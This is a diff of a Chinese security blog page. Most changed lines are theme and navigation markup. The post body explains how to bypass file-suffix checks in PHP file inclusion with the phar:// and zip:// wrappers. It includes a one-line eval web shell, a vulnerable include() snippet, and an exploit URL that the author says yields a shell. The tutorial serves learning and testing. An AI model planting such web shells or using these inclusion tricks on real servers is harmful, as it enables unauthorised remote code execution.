@@ -75,7 +75,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">477</span>
+            <span class="post-count">466</span>
         </span>
     </span>
 
@@ -101,19 +101,21 @@
        
   <p>phar与zip协议的文件包含</p>
 <a id="more"></a>
-
-<h2 id="phar文件包含"><a href="#phar文件包含" class="headerlink" title="phar文件包含"></a>phar文件包含</h2><p>phar协议要求：php大于5.3.0</p>
+<h2 id="phar文件包含"><a class="header-anchor" href="#phar文件包含">¶</a>phar文件包含</h2>
+<p>phar协议要求：php大于5.3.0</p>
 <p>需要将php.ini的参数phar.readonly设置为off</p>
 <p><strong>这个方法适用于验证包含文件为特定后缀时。</strong></p>
 <p>使用<code>Phar://</code>伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们的压缩包（其实就是一个压缩包），只不过我们换了一种方式去执行而已</p>
 <p>本地测试：</p>
 <p>test.php</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>然后将test.php压缩，将压缩文件改后缀为<code>.jpg</code><br>index.php</p>
+<p>然后将test.php压缩，将压缩文件改后缀为<code>.jpg</code><br>
+index.php</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&#39;phar:&#x2F;&#x2F;.&#x2F;test.jpg&#x2F;test.php&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>成功包含</p>
 <p><img src="http://ww1.sinaimg.cn/large/007CwoFZly1gle532gfazj319n0knaby.jpg" alt="QQ截图20201206145217.png"></p>
-<h2 id="zip协议包含文件"><a href="#zip协议包含文件" class="headerlink" title="zip协议包含文件"></a>zip协议包含文件</h2><p>zip协议要求：php版本要求大于等于5.3.0</p>
+<h2 id="zip协议包含文件"><a class="header-anchor" href="#zip协议包含文件">¶</a>zip协议包含文件</h2>
+<p>zip协议要求：php版本要求大于等于5.3.0</p>
 <p>这个方法适用于验证包含文件为特定后缀时。 例如以下代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) &#x3D;&#x3D; &quot;.jpg&quot;)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">include($file.&#39;.jpg&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>上面的代码一个验证了后缀是否为jpg，一个是直接添加了jpg后缀，然后才包含。对于现在这种情况，要包含php文件的话的，可以通过截断。但是\x00的截断在php&gt;5.3.4就没用了，而且还要考虑GPC,所以是比较鸡肋的方法。其实我们可以通过zip协议和phar协议来包含文件。</p>
@@ -124,8 +126,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?file&#x3D;zip:&#x2F;&#x2F;php.zip%23php.jpg</span><br></pre></td></tr></table></figure>
 <p><img src="https://bl4ck.in/old_img/2017-04-17-819654707.png" alt="819654707"></p>
 <p>这样就成功shell了。</p>
-<p>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3692">https://xz.aliyun.com/t/3692</a></p>
-<p><a target="_blank" rel="noopener" href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html">https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html</a></p>
+<p>参考https://xz.aliyun.com/t/3692</p>
+<p><a target="_blank" rel="noopener" href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html">https://bl4ck.in/tricks/2015/06/10/zip或phar协议包含文件.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://lightless.me/archives/include-file-from-zip-or-phar.html">https://lightless.me/archives/include-file-from-zip-or-phar.html</a></p>
  
       <!-- reward -->
@@ -365,11 +367,7 @@
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/friends">友链</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/2019/about">关于我</a>
+      <a class="nav-item-link" href="/about">关于我</a>
     </li>
     
   </ul>
@@ -575,6 +573,10 @@
 
 
 <!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
 
 <!-- ClickBoom1 -->
 
